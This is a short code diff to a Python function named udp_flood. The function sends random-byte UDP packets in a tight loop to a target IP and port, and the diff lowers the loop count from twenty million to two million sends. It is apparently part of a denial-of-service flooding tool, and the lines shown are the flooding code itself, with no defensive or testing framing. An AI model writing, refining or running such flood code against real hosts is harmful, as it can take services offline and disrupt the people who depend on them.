@@ -32,7 +32,7 @@ def udp_flood(target_ip, target_port, stop_flag):
         try:
             packet_size = random.randint(64, 1469)
             data = os.urandom(packet_size)
-            for _ in range(20000000): 
+            for _ in range(2000000): 
                 sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
